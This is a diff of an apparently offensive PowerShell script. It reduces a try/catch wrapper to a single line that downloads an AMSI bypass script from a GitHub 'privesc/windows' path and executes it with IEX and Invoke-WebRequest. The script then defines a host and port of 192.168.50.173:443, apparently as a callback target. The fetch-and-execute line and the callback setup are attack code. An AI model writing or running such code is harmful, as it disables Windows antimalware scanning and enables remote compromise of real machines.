@@ -1,18 +1,4 @@
-
-$scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1"
-
-$scriptBlock = {
-    try {
-        IEX (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing)
-    }
-    catch {
-        Write-Error "Error executing external script: $_"
-        exit 1
-    }
-}
-
-# Run the AMSI bypass script first
-. $scriptBlock
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1" -UseBasicParsing)
 Start-Sleep -Milliseconds 500
 # Define the subsequent script
 $s = '192.168.50.173:443'
